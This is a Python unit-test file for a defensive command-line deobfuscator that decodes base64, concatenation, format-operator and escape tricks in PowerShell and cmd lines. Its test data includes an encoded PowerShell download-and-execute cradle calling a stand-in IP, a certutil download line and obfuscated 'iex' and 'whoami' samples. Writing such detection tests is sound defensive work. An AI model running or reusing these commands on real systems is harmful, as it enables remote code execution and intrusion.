"""Tests for core.cmdline_deobfuscator — Layer 2.

Per ``docs/cmdline_analyzer_plan.md`` D2, every transform here is a pure string
operation: nothing in this module may execute, evaluate or interpret the input.
The tests below therefore assert on *folded text*, never on side effects.
"""
from __future__ import annotations

import unittest

from core import cmdline_deobfuscator as dob

# IEX (New-Object Net.WebClient).DownloadString('http://198.51.100.7/a.ps1')
ENCODED_CRADLE = (
    "SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA"
    "LgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADgALgA1ADEA"
    "LgAxADAAMAAuADcALwBhAC4AcABzADEAJwApAA=="
)


class TestNoOpCases(unittest.TestCase):
    def test_plain_command_line_is_untouched(self) -> None:
        result = dob.deobfuscate("certutil.exe -urlcache -split -f http://x/a.exe a.exe")
        self.assertFalse(result.was_obfuscated)
        self.assertIsNone(result.decoded_command)
        self.assertEqual(result.decode_chain, [])

    def test_benign_installer_line_is_untouched(self) -> None:
        # Known-good sample. A deobfuscator that fires here would poison every
        # downstream layer with a bogus "was obfuscated" signal.
        line = r'msiexec /i "C:\ProgramData\vendor\agent.msi" /qn REBOOT=ReallySuppress'
        result = dob.deobfuscate(line)
        self.assertFalse(result.was_obfuscated)

    def test_empty_input(self) -> None:
        for value in ("", "   ", None):
            with self.subTest(value=value):
                result = dob.deobfuscate(value)
                self.assertFalse(result.was_obfuscated)
                self.assertIsNone(result.decoded_command)


class TestBase64Decoding(unittest.TestCase):
    def test_encoded_command_utf16le(self) -> None:
        result = dob.deobfuscate(f"powershell.exe -NoP -W Hidden -Enc {ENCODED_CRADLE}")
        self.assertTrue(result.was_obfuscated)
        self.assertIn("DownloadString", result.decoded_command)
        self.assertIn("http://198.51.100.7/a.ps1", result.decoded_command)

    def test_short_flag_forms_are_recognised(self) -> None:
        for flag in ("-e", "-en", "-enc", "-EncodedCommand", "-ec"):
            with self.subTest(flag=flag):
                result = dob.deobfuscate(f"powershell {flag} dwBoAG8AYQBtAGkAIAAvAGEAbABsAA==")
                self.assertTrue(result.was_obfuscated)
                self.assertIn("whoami /all", result.decoded_command)

    def test_utf16le_is_tried_before_utf8(self) -> None:
        # Decoding a UTF-16LE payload as UTF-8 yields NUL-interleaved text that
        # then fails every downstream keyword and Sigma match.
        result = dob.deobfuscate(f"powershell -enc {ENCODED_CRADLE}")
        self.assertNotIn("\x00", result.decoded_command)

    def test_utf8_payload_still_decodes(self) -> None:
        result = dob.deobfuscate("powershell -enc cGxhaW4gdXRmOCBwYXlsb2FkIGhlcmU=")
        self.assertIn("plain utf8 payload here", result.decoded_command)

    def test_frombase64string_literal(self) -> None:
        result = dob.deobfuscate(
            "powershell -c \"[Convert]::FromBase64String('dwBoAG8AYQBtAGkAIAAvAGEAbABsAA==')\""
        )
        self.assertTrue(result.was_obfuscated)
        self.assertIn("whoami /all", result.decoded_command)

    def test_non_base64_argument_is_left_alone(self) -> None:
        result = dob.deobfuscate("powershell -File C:\\scripts\\backup.ps1")
        self.assertFalse(result.was_obfuscated)

    def test_short_blob_is_not_treated_as_base64(self) -> None:
        # Guards against decoding ordinary words that happen to be valid base64.
        result = dob.deobfuscate("powershell -enc test")
        self.assertFalse(result.was_obfuscated)

    def test_undecodable_blob_does_not_raise(self) -> None:
        result = dob.deobfuscate("powershell -enc " + "!" * 40)
        self.assertFalse(result.was_obfuscated)

    def test_binary_payload_is_rejected_not_mangled(self) -> None:
        # Decodes cleanly as bytes but is not text — emitting mojibake would be
        # worse than reporting no decode.
        import base64 as _b64
        blob = _b64.b64encode(bytes(range(1, 200))).decode()
        result = dob.deobfuscate(f"powershell -enc {blob}")
        self.assertFalse(result.was_obfuscated)


class TestStringFolding(unittest.TestCase):
    def test_quoted_concatenation(self) -> None:
        result = dob.deobfuscate("powershell -c ('c'+'a'+'l'+'c')")
        self.assertTrue(result.was_obfuscated)
        self.assertIn("calc", result.decoded_command)

    def test_double_quoted_concatenation(self) -> None:
        result = dob.deobfuscate('cmd /c ("who"+"ami")')
        self.assertIn("whoami", result.decoded_command)

    def test_char_code_concatenation(self) -> None:
        result = dob.deobfuscate("powershell -c ([char]99+[char]97+[char]108+[char]99)")
        self.assertIn("calc", result.decoded_command)

    def test_char_array_join(self) -> None:
        result = dob.deobfuscate("powershell -c ([char[]](99,97,108,99) -join '')")
        self.assertIn("calc", result.decoded_command)

    def test_format_operator(self) -> None:
        result = dob.deobfuscate("powershell -c (\"{1}{0}\" -f 'x','ie')")
        self.assertTrue(result.was_obfuscated)
        self.assertIn("iex", result.decoded_command)

    def test_format_operator_three_parts(self) -> None:
        result = dob.deobfuscate("powershell -c ('{2}{0}{1}' -f 'w','er','po')")
        self.assertIn("power", result.decoded_command)

    def test_format_operator_with_out_of_range_index_is_left_alone(self) -> None:
        line = "powershell -c ('{9}{0}' -f 'a','b')"
        result = dob.deobfuscate(line)
        self.assertFalse(result.was_obfuscated)

    def test_backtick_inside_word_is_folded(self) -> None:
        result = dob.deobfuscate("p`o`w`e`r`s`h`e`l`l -c i`e`x")
        self.assertTrue(result.was_obfuscated)
        self.assertIn("powershell", result.decoded_command)
        self.assertIn("iex", result.decoded_command)

    def test_trailing_backtick_continuation_is_not_obfuscation(self) -> None:
        # A backtick at end of line is line continuation, not token splitting.
        result = dob.deobfuscate("Copy-Item -Path a `\n -Destination b")
        self.assertFalse(result.was_obfuscated)


class TestEncodingLayers(unittest.TestCase):
    def test_percent_encoding(self) -> None:
        result = dob.deobfuscate("cmd /c %63%61%6c%63%2e%65%78%65")
        self.assertIn("calc.exe", result.decoded_command)

    def test_cmd_environment_variable_is_not_percent_decoded(self) -> None:
        # %SystemRoot% is not percent-encoding; decoding it would corrupt a very
        # common benign path.
        result = dob.deobfuscate(r"copy %SystemRoot%\notepad.exe %TEMP%\n.exe")
        self.assertFalse(result.was_obfuscated)

    def test_single_percent_sequence_does_not_trigger(self) -> None:
        result = dob.deobfuscate("curl http://example.com/a%20b.txt")
        self.assertFalse(result.was_obfuscated)

    def test_html_entities(self) -> None:
        result = dob.deobfuscate("cmd /c &#99;&#97;&#108;&#99;")
        self.assertIn("calc", result.decoded_command)

    def test_unicode_escapes(self) -> None:
        result = dob.deobfuscate(r"powershell -c \u0063\u0061\u006c\u0063")
        self.assertIn("calc", result.decoded_command)

    def test_hex_escapes(self) -> None:
        result = dob.deobfuscate(r"cmd /c \x63\x61\x6c\x63")
        self.assertIn("calc", result.decoded_command)


class TestIterationAndCaps(unittest.TestCase):
    def test_layered_encoding_resolves_to_fixed_point(self) -> None:
        import base64 as _b64
        inner = _b64.b64encode("whoami /all".encode("utf-16-le")).decode()
        outer = _b64.b64encode(f"powershell -enc {inner}".encode("utf-16-le")).decode()
        result = dob.deobfuscate(f"powershell -enc {outer}")
        self.assertIn("whoami /all", result.decoded_command)
        self.assertGreaterEqual(result.rounds, 2)

    def test_round_cap_is_enforced(self) -> None:
        self.assertEqual(dob.MAX_DECODE_ROUNDS, 5)
        result = dob.deobfuscate(f"powershell -enc {ENCODED_CRADLE}")
        self.assertLessEqual(result.rounds, dob.MAX_DECODE_ROUNDS)

    def test_output_size_cap_is_enforced(self) -> None:
        import base64 as _b64
        blob = _b64.b64encode(("A" * (dob.MAX_DECODED_BYTES + 5000)).encode("utf-8")).decode()
        result = dob.deobfuscate(f"powershell -enc {blob}")
        self.assertTrue(result.truncated)
        self.assertLessEqual(len(result.decoded_command or ""), dob.MAX_DECODED_BYTES)


class TestDecodeChain(unittest.TestCase):
    def test_chain_records_each_applied_transform(self) -> None:
        result = dob.deobfuscate(f"p`o`w`e`r`s`h`e`l`l -enc {ENCODED_CRADLE}")
        self.assertTrue(result.decode_chain)
        joined = " ".join(result.decode_chain).lower()
        self.assertIn("backtick", joined)
        self.assertIn("base64", joined)

    def test_chain_is_empty_when_nothing_fired(self) -> None:
        result = dob.deobfuscate("whoami /all")
        self.assertEqual(result.decode_chain, [])

    def test_original_is_always_preserved(self) -> None:
        line = f"powershell -enc {ENCODED_CRADLE}"
        result = dob.deobfuscate(line)
        self.assertEqual(result.original, line)


if __name__ == "__main__":
    unittest.main()
